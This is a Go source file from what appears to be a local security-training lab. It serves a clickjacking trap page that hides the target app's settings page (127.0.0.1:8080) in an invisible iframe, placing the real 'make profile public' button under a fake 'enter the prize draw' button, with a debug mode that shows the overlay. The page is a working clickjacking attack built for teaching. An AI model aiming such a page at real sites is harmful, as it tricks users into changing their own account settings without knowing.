package main

import "net/http"

// このファイルはクリックジャッキングの「攻撃者のサイト(罠ページ)」を模したもの。
// 標的アプリ(8080)の設定ページを透明な iframe で重ね、見せかけのボタンをクリックさせる。
// 標的側のボタンは position:absolute; left:16px; top:200px(240x48)に固定してあり、
// ここでは iframe を (20,60) に置き、偽ボタンを iframe 内のボタンと同じ位置に置く。
// 偽ボタンの位置 = iframe の位置 + (16,200) = (36,260)。

const trapClickjackHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>景品に応募 - vuln-lab</title>
<style>
  body { font-family: sans-serif; margin: 0; }
  .decoy { position: absolute; left: 36px; top: 260px; width: 240px; height: 48px; font-size: 16px; }
  iframe { position: absolute; left: 20px; top: 60px; width: 400px; height: 300px; border: 0; opacity: 0; }
  iframe.debug { opacity: 0.5; border: 1px dashed #b00020; }
</style></head>
<body>
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<h2 style="margin:8px 20px">抽選に当選しました!</h2>
<button class="decoy" type="button">景品に応募する</button>
<iframe id="victim" src="http://127.0.0.1:8080/clickjack/settings" title="標的ページ"></iframe>
<script>
  if (new URLSearchParams(location.search).has('debug')) {
    document.getElementById('victim').className = 'debug';
  }
</script>
<p style="position:absolute; left:20px; top:380px; font-size:14px">
  先に <a href="http://127.0.0.1:8080/clickjack/login" target="_blank">http://127.0.0.1:8080/clickjack/login</a> でログインしてから開いてください。
  <a style="display:inline-block;padding:6px 12px;margin:4px 8px 4px 0;background:#444;color:#fff;text-decoration:none;border-radius:4px" href="http://127.0.0.1:8080/clickjack/login" target="_blank" rel="noopener">被害者としてログインする</a><a style="display:inline-block;padding:6px 12px;margin:4px 8px 4px 0;background:#444;color:#fff;text-decoration:none;border-radius:4px" href="http://127.0.0.1:8080/clickjack/settings" target="_blank" rel="noopener">被害者の設定画面を開く</a>
  <a href="/clickjack/?debug=1">重なりを見る(?debug=1)</a>
</p>
</body></html>`

// registerClickjackTrapRoutes はクリックジャッキングの罠ページを登録する。
func registerClickjackTrapRoutes(mux *http.ServeMux) {
	mux.Handle("GET /clickjack/{$}", trapPage(withNote(trapClickjackHTML,
		"標的アプリの /clickjack/settings を、透明な(opacity:0)iframe で重ねて表示しています。見せかけの「景品に応募する」ボタンの真上に、本物の「プロフィールを公開する」ボタンが位置するため、押すと本物が押されます。?debug=1 で iframe が半透明になります。")))
}
